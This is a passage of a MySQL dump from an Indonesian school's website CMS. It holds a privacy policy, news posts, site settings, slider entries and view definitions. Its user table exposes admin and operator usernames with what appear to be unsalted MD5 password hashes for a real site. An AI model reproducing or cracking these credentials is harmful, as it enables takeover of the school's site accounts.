&rarr; Google\'s use of the DART cookie enables it to serve ads to our site\'s visitors based upon their visit to http://www.smkn1jenpo.sch.id and other sites on the Internet. <br /> &rarr; Users may opt out of the use of the DART cookie by visiting the Google ad and content network privacy policy at the following URL - <a title=\"Opt out of the Dart Cookie\" href=\"http://www.google.com/privacy_ads.html\">http://www.google.com/privacy_ads.html</a></p>\r\n<p><strong>Our Advertising Partners</strong><br /> Some of our advertising partners may use cookies and web beacons on our site. Our advertising partners include .......</p>\r\n<p><em>While each of these advertising partners has their own Privacy Policy for their site, an updated and hyperlinked resource is maintained here: <a href=\"http://www.privacypolicyonline.com/privacy-policies\">Privacy Policies</a>.<br /> You may consult this listing to find the privacy policy for each of the advertising partners of http://www.smkn1jenpo.sch.id.</em></p>\r\n<p>These third-party ad servers or ad networks use technology in their respective advertisements and links that appear on http://www.smkn1jenpo.sch.id and which are sent directly to your browser. They automatically receive your IP address when this occurs. Other technologies (such as cookies, JavaScript, or Web Beacons) may also be used by our site\'s third-party ad networks to measure the effectiveness of their advertising campaigns and/or to personalize the advertising content that you see on the site.</p>\r\n<p>http://www.smkn1jenpo.sch.id has no access to or control over these cookies that are used by third-party advertisers.</p>\r\n<p>&nbsp;</p>\r\n<p><strong>Third Party Privacy Policies</strong><br /> You should consult the respective privacy policies of these third-party ad servers for more detailed information on their practices as well as for instructions about how to opt-out of certain practices. http://www.smkn1jenpo.sch.id\'s privacy policy does not apply to, and we cannot control the activities of, such other advertisers or web sites. You may find a comprehensive listing of these privacy policies and their links here: <a title=\"Privacy Policy Links\" href=\"http://www.privacypolicyonline.com/privacy-policy-links\">Privacy Policy Links</a>.</p>\r\n<p>If you wish to disable cookies, you may do so through your individual browser options. More detailed information about cookie management with specific web browsers can be found at the browsers\' respective websites. <a href=\"http://www.privacypolicyonline.com/what-are-cookies\">What Are Cookies?</a></p>\r\n<p><strong>Children\'s Information</strong><br />We believe it is important to provide added protection for children online. We encourage parents and guardians to spend time online with their children to observe, participate in and/or monitor and guide their online activity. http://www.smkn1jenpo.sch.id does not knowingly collect any personally identifiable information from children under the age of 13. If a parent or guardian believes that http://www.smkn1jenpo.sch.id has in its database the personally-identifiable information of a child under the age of 13, please contact us immediately (using the contact in the first paragraph) and we will use our best efforts to promptly remove such information from our records.</p>\r\n<p><strong>Online Privacy Policy Only</strong><br /> This privacy policy applies only to our online activities and is valid for visitors to our website and regarding information shared and/or collected there. This policy does not apply to any information collected offline or via channels other than this website.</p>\r\n<p><strong>Consent</strong><br /> By using our website, you hereby consent to our privacy policy and agree to its terms.</p>\r\n<p><br /><br /></p>\r\n<p><strong>Update</strong><br />This Privacy Policy was last updated on: Thursday, October 13th, 2016. <br /><br /><em>Should we update, amend or make any changes to our privacy policy, those changes will be posted here.</em> <br /><br /></p>\r\n<p><!-- END of Privacy Policy || Generated by http://www.PrivacyPolicyOnline.com || --></p>', '2016-10-14', '2016-10-14 09:40:51', 667, 'http://www.smkn1jenpo.sch.id/', 'privacy-policy', 'http://www.smkn1jenpo.sch.id/privacy-policy', 2, 1, 0, '0', '09:40:51', '', 'pages', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (735, '5', 'Perpustakaan', '<p><img src=\"http://localhost/smtj/upload/2-02_preview.jpg\" alt=\"\" /></p>\r\n<p>Tes berita</p>', '2018-08-30', '2018-08-30 08:50:52', 3, 'http://localhost/smtj/news/735', 'perpustakaan', 'http://localhost/smtj/news/735/perpustakaan', 4, 1, 0, '6', '08:50:52', '', 'news', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (736, '', 'Contact us', '<p>Contact us</p>', '2018-08-30', '2018-08-30 09:03:14', 0, 'http://localhost/smtj/', 'contact', 'http://localhost/smtj/contact', 4, 1, 0, '0', '09:03:14', '', 'pages', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (737, '', 'tes halaman', '<p>mantabd djiwa</p>', '2018-08-30', '2018-08-30 09:04:29', 0, 'http://localhost/smtj/', 'tes-halaman', 'http://localhost/smtj/tes-halaman', 4, 1, 0, '0', '09:04:29', '', 'pages', 0, 0, '', '', '', '', '');
INSERT INTO `tb_post` VALUES (738, '4', 'Terjamin, LG Single Commercial AC dapat Sertifikat Hemat Energi dari UI', '<p><strong><img src=\"https://cdn1-production-images-kly.akamaized.net/zLifJca5b5EWz3vfmGiRR3HiMd4=/640x360/smart/filters:quality(75):strip_icc():format(webp)/kly-media-production/medias/2330619/original/041242900_1534314713-LG_673x373.jpg\" alt=\"\" width=\"640\" height=\"360\" /></strong></p>\r\n<p><strong>Liputan6.com, Jakarta</strong>&nbsp;Krisis energi seakan menjadi isu yang tak pernah selesai di dunia global, termasuk di Indonesia. Penggunaan perangkat elektronik sehari-hari di perkantoran membuat konsumsi energi semakin tinggi.</p>\r\n<p>Melihat fenomena tersebut, Pemerintah Indonesia pun mau tinggal diam. Pemerintah melakukan aksi untuk mengakselerasi aktivitas penghematan energi.</p>\r\n<div class=\"baca-juga\" data-category=\"Tech News\" data-cache-key=\"https_liputan6.com:bump:TextTypeArticle#3619545::isNotMobile::c00d8d8c44939a8866b3f478c52afc3d\" data-cache-ttl=\"360\" data-component-name=\"desktop:read-page:article-content-body:section:bacajuga\">\r\n<p class=\"baca-juga__header\">BACA JUGA</p>\r\n<ul class=\"baca-juga__list\">\r\n<li><a href=\"https://www.liputan6.com/tekno/read/3610253/sharp-bakal-bersaing-di-pasar-panel-oled-smartphone\" target=\"_blank\">Sharp Bakal Bersaing di Pasar Panel OLED Smartphone</a></li>\r\n<li><a href=\"https://www.liputan6.com/tekno/read/3604785/smartphone-mewah-terbaru-lg-dibanderol-rp-25-jutaan\" target=\"_blank\">Smartphone Mewah Terbaru LG Dibanderol Rp 25 Jutaan</a></li>\r\n<li><a href=\"https://www.liputan6.com/tekno/read/3588363/huawei-dilaporkan-rilis-duo-smartwatch-wear-os-bulan-ini\" target=\"_blank\">Huawei Dilaporkan Rilis Duo Smartwatch Wear OS Bulan Ini</a></li>\r\n</ul>\r\n</div>\r\n<div id=\"AdAsia\">&nbsp;</div>\r\n<p>Gerakan tersebut mendapat dukungan penuh dari PT. LG Electronics Indonesia (LG), sebagai pabrik perangkat elektronik yang telah menjadi bagian dari komunitas Indonesia selama 26 tahun.</p>\r\n<p>\"Bersama dengan pemerintah Indonesia, kami optimistis menjadikan kampanye hemat energi menjadi gerakan yang sukses. Kontribusi kami untuk berpartisipasi dalam kampanye ini terlihat dari meluasnya teknologi LG Inverter. LG tidak hanya menyediakan teknologi inverter untuk LG&nbsp;<em>Residential</em>&nbsp;AC, namun juga meluas ke koleksi baru LG&nbsp;<em>Single Commercial AC</em>,\" ujar Presiden Direktur PT. LG Electronics Indonesia, Seungmin Park, dalam sambutannya di LG Air Conditioning Inverter - Universitas Indonesia Energy Saving Certification, di Hotel Fairmont Jakarta, Selasa (14/8/2018).</p>\r\n<p><em>Single Commercial Air Conditioning</em>&nbsp;(SCAC) hadir sebagai solusi untuk rumah besar dan gedung perkantoran yang membutuhkan pendingin ruangan hemat listrik. Hadir dalam dua model, AC ini memiliki kapasitas pendinginan lebih besar, yaitu 4PK untuk model&nbsp;<em>ceiling cassette</em>&nbsp;dan 5PK untuk produk&nbsp;<em>floor ceiling</em>.</p>\r\n<p>Kedua produk tersebut juga sudah benar-benar terjamin hemat energi. Tak main-main, LG melakukan pengujian tingkat konsumsi listrik untuk kedua AC ini di lembaga Electric Power and Energy Studies (EPES) Universitas Indonesia (UI). Tes ini dipimpin oleh Kepala EPES UI, Iwa Garniwa, bersama timnya.</p>\r\n<p>Proses pengujian dilakukan selama dua bulan dengan penetapan pengaturan suhu 18?C dan 24?C, yaitu dua temperatur yang paling sering digunakan dalam pemakaian AC. Lebih lanjut, kondisi temperatur ini dibagi dalam tiga beban pendinginan, 20% mewakili suhu sekitar cenderung sejuk seperti malam hari, 50% seperti cuaca normal cenderung panas, hingga 100% laiknya AC bekerja di cuaca terik.</p>\r\n<p>\"Selama 24 jam kita bandingkan (AC LG Inverter dan non-inverter), penghematannya mencapai 61,55 persen untuk yang&nbsp;<em>floor standing</em>&nbsp;serta yang tipe&nbsp;<em>ceiling</em>&nbsp;mencapai 50 persen. Jadi, ini menunjukkan bahwa yang inverter menunjukkan penghematan yang sangat tinggi dibandingkan non-inverter,\" ucap Iwa, dalam acara sama.</p>\r\n<p>Sertifikat Hemat Energi diberikan oleh pihak EPES UI yang diwakilkan Iwa kepada James Lee selaku perwakilan dari PT. LG Electronics Indonesia dalam acara LG Air Conditioning Inverter - Universitas Indonesia Energy Saving Certification, di Hotel Fairmont Jakarta, Selasa (14/8/2018).</p>\r\n<p><strong>Memenuhi standar pemerintah</strong></p>\r\n<p>LG Inverter juga menambah produk pendingin ruangan berbasis teknologi inverter yang ada di pasaran. Berdasarkan data dari Direktorat Jenderal Energi Baru Terbarukan dan Konservasi Energi, baru 9 persen AC di pasaran yang menggunakan teknologi inverter.</p>', '2018-08-30', '2018-08-30 15:44:06', 0, 'http://localhost/smtj/news/738', 'terjamin,-lg-single-commercial-ac-dapat-sertifikat-hemat-energi-dari-ui', 'http://localhost/smtj/news/738/terjamin,-lg-single-commercial-ac-dapat-sertifikat-hemat-energi-dari-ui', 4, 1, 0, '6', '15:44:06', '', 'news', 0, 0, '', '', '', '', '');

-- ----------------------------
-- Table structure for tb_prestasi
-- ----------------------------
DROP TABLE IF EXISTS `tb_prestasi`;
CREATE TABLE `tb_prestasi`  (
  `id_prestasi` int(11) NOT NULL AUTO_INCREMENT,
  `nama_lomba` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `jenis` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `skala` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `juara` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `tahun` int(11) NOT NULL,
  PRIMARY KEY (`id_prestasi`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_prestasi
-- ----------------------------
INSERT INTO `tb_prestasi` VALUES (1, 'IARC ITS Bidang PLC', 'Student', 'Nasional', 'Juara 3', 2015);
INSERT INTO `tb_prestasi` VALUES (2, 'UNY EUFORIA 2014', 'Student', 'Nasional', 'Juara 3', 2014);
INSERT INTO `tb_prestasi` VALUES (3, 'LITM (Lomba Inovasi Teknologi Mahasiswa) di UNY', 'Student', 'Nasional', 'Juara 3', 2014);
INSERT INTO `tb_prestasi` VALUES (4, 'Lomba Pengisian Web Konten akademikomunitas.id dari PENS', 'Lembaga', 'Nasional', 'Juara 2', 2015);

-- ----------------------------
-- Table structure for tb_produk
-- ----------------------------
DROP TABLE IF EXISTS `tb_produk`;
CREATE TABLE `tb_produk`  (
  `id_produk` int(11) NOT NULL AUTO_INCREMENT,
  `judul` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `kategori` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `pembuat` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `keterangan` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `diterbitkan` datetime(0) NOT NULL,
  `id_user` int(11) NOT NULL,
  `status` int(11) NOT NULL,
  `jumlah_baca` int(120) NOT NULL,
  `fitur_img` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `alt_img` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `deskripsi` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `link` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `nama_link` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `link_asli` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`id_produk`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 1 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Table structure for tb_setting
-- ----------------------------
DROP TABLE IF EXISTS `tb_setting`;
CREATE TABLE `tb_setting`  (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `setting` varchar(50) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `ind` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `eng` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`id`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 9 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_setting
-- ----------------------------
INSERT INTO `tb_setting` VALUES (1, 'nama_web', 'AKN Ponorogo', '');
INSERT INTO `tb_setting` VALUES (2, 'telepon', '(0352) 481236', '');
INSERT INTO `tb_setting` VALUES (3, 'fax', '(0352) 481236', '');
INSERT INTO `tb_setting` VALUES (4, 'email', 'smkn1jenpo@yahoo.co.id', '');
INSERT INTO `tb_setting` VALUES (5, 'alamat', 'Jl. Niken Gandini No.98, Setono, Kec. Ponorogo, Kabupaten Ponorogo, Jawa Timur 63492', '');
INSERT INTO `tb_setting` VALUES (6, 'pagging_frontend', '5', '');
INSERT INTO `tb_setting` VALUES (7, 'favicon', 'img', '');
INSERT INTO `tb_setting` VALUES (8, 'pagging_backend', '23', '');

-- ----------------------------
-- Table structure for tb_slider
-- ----------------------------
DROP TABLE IF EXISTS `tb_slider`;
CREATE TABLE `tb_slider`  (
  `id_slider` int(11) NOT NULL AUTO_INCREMENT,
  `id_file` int(11) NOT NULL,
  `link` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `label` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `deskripsi` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  PRIMARY KEY (`id_slider`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 20 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_slider
-- ----------------------------
INSERT INTO `tb_slider` VALUES (7, 39, '#', 'PEMESINAN', '');
INSERT INTO `tb_slider` VALUES (8, 40, '#', 'Praktikum Konstruksi Kayu', '');
INSERT INTO `tb_slider` VALUES (9, 42, '#', ' ', '');
INSERT INTO `tb_slider` VALUES (10, 41, '#', ' ', '');
INSERT INTO `tb_slider` VALUES (11, 43, '#', ' ', '');
INSERT INTO `tb_slider` VALUES (12, 44, '#', ' ', '');
INSERT INTO `tb_slider` VALUES (13, 45, '#', ' ', '');
INSERT INTO `tb_slider` VALUES (14, 46, '#', ' ', '');
INSERT INTO `tb_slider` VALUES (15, 48, '#', ' ', '');
INSERT INTO `tb_slider` VALUES (16, 49, '#', ' ', '');
INSERT INTO `tb_slider` VALUES (17, 50, '#', ' ', '');
INSERT INTO `tb_slider` VALUES (18, 51, '#', ' ', '');
INSERT INTO `tb_slider` VALUES (19, 52, '#', ' ', '');

-- ----------------------------
-- Table structure for tb_user
-- ----------------------------
DROP TABLE IF EXISTS `tb_user`;
CREATE TABLE `tb_user`  (
  `id_user` int(11) NOT NULL AUTO_INCREMENT,
  `nama` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `username` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `password` text CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `jabatan` varchar(20) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `status` int(1) NOT NULL,
  `last_login` datetime(0) NOT NULL,
  `hak_akses` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL DEFAULT '1-2-3',
  `yg_menambahkan` int(11) NOT NULL,
  PRIMARY KEY (`id_user`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 5 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_user
-- ----------------------------
INSERT INTO `tb_user` VALUES (2, 'Administrator', 'admin', '303876a18959ebca69e05190a7fb0a81', 'Administrator', 1, '2017-05-02 11:23:10', '1-2-3-4-5-6-7-8-9-10-11-12-13-19-20-21-22-23-24-25', 2);
INSERT INTO `tb_user` VALUES (3, 'Pringgo Juni Saputro', 'pjs', '1341215dbe9acab4361fd6417b2b11bc', 'Operator', 1, '2016-10-18 12:17:09', '1-4-5-6-7-8-9-10-11-13-25', 2);
INSERT INTO `tb_user` VALUES (4, 'Administrator', 'adminnew', '7e805b44db82acf0c71e65b786363da4', 'Administrator', 1, '2018-08-30 15:39:10', '1-2-3-4-5-6-7-8-9-10-11-12-13-19-20-21-22-23-24-25', 2);

-- ----------------------------
-- View structure for agenda_view
-- ----------------------------
DROP VIEW IF EXISTS `agenda_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `agenda_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi`,`tb_post`.`eng_post` AS `eng_post`,`tb_post`.`eng_title` AS `eng_title` from `tb_post` where (`tb_post`.`type` = 'agenda') order by `tb_post`.`id_post` desc ;

-- ----------------------------
-- View structure for announcement_draf_view
-- ----------------------------
DROP VIEW IF EXISTS `announcement_draf_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `announcement_draf_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi` from `tb_post` where ((`tb_post`.`type` = 'news') and (`tb_post`.`status` = '2')) order by `tb_post`.`id_post` desc ;

-- ----------------------------
-- View structure for announcement_pending_view
-- ----------------------------
DROP VIEW IF EXISTS `announcement_pending_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `announcement_pending_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi` from `tb_post` where ((`tb_post`.`type` = 'news') and (`tb_post`.`status` = '4')) order by `tb_post`.`id_post` desc ;

-- ----------------------------
-- View structure for announcement_trash_view
-- ----------------------------
DROP VIEW IF EXISTS `announcement_trash_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `announcement_trash_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi` from `tb_post` where ((`tb_post`.`type` = 'news') and (`tb_post`.`status` = '3')) order by `tb_post`.`id_post` desc ;

-- ----------------------------
-- View structure for announcement_view
-- ----------------------------
DROP VIEW IF EXISTS `announcement_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `announcement_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi` from `tb_post` where (`tb_post`.`type` = 'announcement') order by `tb_post`.`id_post` desc ;

-- ----------------------------
-- View structure for files_attachement
-- ----------------------------
DROP VIEW IF EXISTS `files_attachement`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `files_attachement` AS select `tb_file`.`id_file` AS `id_file`,`tb_file`.`nama` AS `nama`,`tb_file`.`ukuran` AS `ukuran`,`tb_file`.`tanggal` AS `tanggal`,`tb_file`.`link` AS `link`,`tb_file`.`type` AS `type`,`tb_file`.`trash` AS `trash` from `tb_file` where (`tb_file`.`type` not in ('webm','mkv','flv','vob','ogv','ogg','drc','avi','wmv','mp4','m4p','mpg','mpeg','m4v','3gp','JPG','jpg','jpeg','PNG','png','GIF','gif','ico','ICO','bmp','BMP','NEF','nef','tif','TIF','RAW','raw','mp3')) ;

-- ----------------------------
-- View structure for files_audio
-- ----------------------------
DROP VIEW IF EXISTS `files_audio`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `files_audio` AS select `tb_file`.`id_file` AS `id_file`,`tb_file`.`nama` AS `nama`,`tb_file`.`ukuran` AS `ukuran`,`tb_file`.`tanggal` AS `tanggal`,`tb_file`.`link` AS `link`,`tb_file`.`type` AS `type`,`tb_file`.`trash` AS `trash` from `tb_file` where (`tb_file`.`type` = 'mp3') ;

-- ----------------------------
-- View structure for files_img
-- ----------------------------
DROP VIEW IF EXISTS `files_img`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `files_img` AS select `tb_file`.`id_file` AS `id_file`,`tb_file`.`nama` AS `nama`,`tb_file`.`ukuran` AS `ukuran`,`tb_file`.`tanggal` AS `tanggal`,`tb_file`.`link` AS `link`,`tb_file`.`type` AS `type`,`tb_file`.`trash` AS `trash` from `tb_file` where (`tb_file`.`type` in ('JPG','jpg','jpeg','PNG','png','GIF','gif','ico','ICO','bmp','BMP','NEF','nef','tif','TIF','RAW','raw')) ;

-- ----------------------------
-- View structure for files_video
-- ----------------------------
DROP VIEW IF EXISTS `files_video`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `files_video` AS select `tb_file`.`id_file` AS `id_file`,`tb_file`.`nama` AS `nama`,`tb_file`.`ukuran` AS `ukuran`,`tb_file`.`tanggal` AS `tanggal`,`tb_file`.`link` AS `link`,`tb_file`.`type` AS `type`,`tb_file`.`trash` AS `trash` from `tb_file` where (`tb_file`.`type` in ('webm','mkv','flv','vob','ogv','ogg','drc','avi','wmv','mp4','m4p','mpg','mpeg','m4v','3gp')) ;

-- ----------------------------
-- View structure for max_file
-- ----------------------------
DROP VIEW IF EXISTS `max_file`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `max_file` AS select max(`tb_file`.`id_file`) AS `last_id` from `tb_file` ;

-- ----------------------------
-- View structure for pages_view
-- ----------------------------
DROP VIEW IF EXISTS `pages_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `pages_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi`,`tb_post`.`eng_post` AS `eng_post`,`tb_post`.`eng_title` AS `eng_title` from `tb_post` where (`tb_post`.`type` = 'pages') order by `tb_post`.`id_post` desc ;

-- ----------------------------
-- View structure for page_parent_view
-- ----------------------------
DROP VIEW IF EXISTS `page_parent_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `page_parent_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi` from `tb_post` where ((`tb_post`.`type` = 'pages') and (`tb_post`.`parent` = 0)) ;

-- ----------------------------
-- View structure for post_draf_view
-- ----------------------------
DROP VIEW IF EXISTS `post_draf_view`;
CREATE ALGORITHM = UNDEFINED SQL SECURITY DEFINER VIEW `post_draf_view` AS select `tb_post`.`id_post` AS `id_post`,`tb_post`.`kategori` AS `kategori`,`tb_post`.`judul` AS `judul`,`tb_post`.`isi` AS `isi`,`tb_post`.`diterbitkan` AS `diterbitkan`,`tb_post`.`last_update` AS `last_update`,`tb_post`.`jumlah_baca` AS `jumlah_baca`,`tb_post`.`link` AS `link`,`tb_post`.`nama_link` AS `nama_link`,`tb_post`.`link_asli` AS `link_asli`,`tb_post`.`id_user` AS `id_user`,`tb_post`.`status` AS `status`,`tb_post`.`komen` AS `komen`,`tb_post`.`label` AS `label`,`tb_post`.`jam` AS `jam`,`tb_post`.`lokasi` AS `lokasi`,`tb_post`.`type` AS `type`,`tb_post`.`parent` AS `parent`,`tb_post`.`order` AS `order`,`tb_post`.`fitur_img` AS `fitur_img`,`tb_post`.`alt_img` AS `alt_img`,`tb_post`.`deskripsi` AS `deskripsi` from `tb_post` where ((`tb_post`.`type` = 'news') and (`tb_post`.`status` = '2')) order by `tb_post`.`id_post` desc ;

-- ----------------------------
-- View structure for post_pending_view
-- ----------------------------
DROP VIEW IF EXISTS `post_pending_view`;
